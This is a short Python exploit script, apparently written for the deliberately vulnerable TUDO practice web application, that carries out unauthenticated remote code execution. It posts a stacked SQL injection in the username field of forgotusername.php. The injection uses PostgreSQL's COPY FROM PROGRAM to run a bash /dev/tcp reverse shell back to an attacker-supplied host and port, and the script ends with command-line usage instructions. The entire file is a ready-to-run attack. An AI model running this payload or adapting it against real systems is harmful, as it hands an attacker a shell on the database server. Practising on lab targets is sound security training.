#!/usr/bin/python3

# @title  TUDO Unauthenticated RCE #5
# @author rizemon
# @date   03.02.2023

import sys
import requests

def execute_revshell_as_postgres_user(target: str, lhost: str, lport: str):
    url = target + "/forgotusername.php"

    data = {
        "username": f"""'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" | bash'; DROP TABLE IF EXISTS cmd_exec; --"""
    }
    requests.post(url, data=data)

def main():
    if len(sys.argv) != 4:
        print(f"Usage:   {sys.argv[0]} TARGET            LHOST      LPORT")
        print(f"Example: {sys.argv[0]} http://172.17.0.2 172.17.0.1 1337")
        sys.exit(-1)

    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    execute_revshell_as_postgres_user(target, lhost, lport)

if __name__ == "__main__":
    main()
